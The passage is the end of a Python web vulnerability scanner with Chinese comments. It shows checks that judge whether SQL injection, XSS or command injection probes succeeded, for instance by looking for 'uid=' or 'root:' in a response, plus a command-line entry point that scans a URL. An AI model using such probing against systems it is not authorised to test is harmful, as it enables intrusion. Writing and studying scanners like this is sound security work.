        if vuln_type == "SQL注入":
            sql_errors = ["sql syntax", "mysql", "ora-", "sql server"]
            return any(error in content.lower() for error in sql_errors)

        elif vuln_type == "XSS":
            return payload in content

        elif vuln_type == "命令注入":
            return "uid=" in content or "root:" in content

        return False


def scan_expert_vulns(url: str) -> List[Dict]:
    """便捷函数：专家级漏洞扫描"""
    scanner = ExpertVulnScanner()
    return scanner.scan(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        vulns = scan_expert_vulns(sys.argv[1])
        for vuln in vulns:
            print(f"[{vuln['severity']}] {vuln['type']}: {vuln['description']}")
    else:
        print("用法: python vuln_expert.py <url>")
